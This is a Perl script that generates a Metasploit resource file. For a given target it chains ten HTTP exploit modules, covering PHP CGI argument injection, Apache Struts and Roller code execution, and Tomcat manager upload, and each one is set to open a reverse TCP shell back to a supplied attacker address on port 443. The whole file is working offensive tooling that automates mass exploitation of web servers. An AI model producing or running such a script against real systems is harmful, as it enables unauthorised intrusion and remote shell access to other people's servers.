if (@ARGV < 2)
	{
	    print "Usage: ./http_nix.pl source target > http_nix.rc\n";

	} else {
	$source=$ARGV[0];
	$source_port="443";
	$target=$ARGV[1];
	@exploits =("use exploit/multi/http/php_cgi_arg_injection","use exploit/multi/http/apache_roller_ognl_injection","use exploit/multi/http/struts_code_exec","use exploit/multi/http/struts_code_exec_classloader","use exploit/multi/http/struts_code_exec_exception_delegator","use exploit/multi/http/struts_code_exec_parameters","use exploit/multi/http/struts_dev_mode","use exploit/multi/http/struts_include_params","use exploit/multi/http/tomcat_mgr_deploy","use exploit/multi/http/tomcat_mgr_upload");
	
foreach $exploit(@exploits) {
print "\n";
print $exploit."\n";
print "set PAYLOAD generic/shell_reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "set RPORT 80"."\n";
print "set TARGETURI /wp/"."\n";
print "spool off"."\n";
print "run"."\n"; }
	
	}

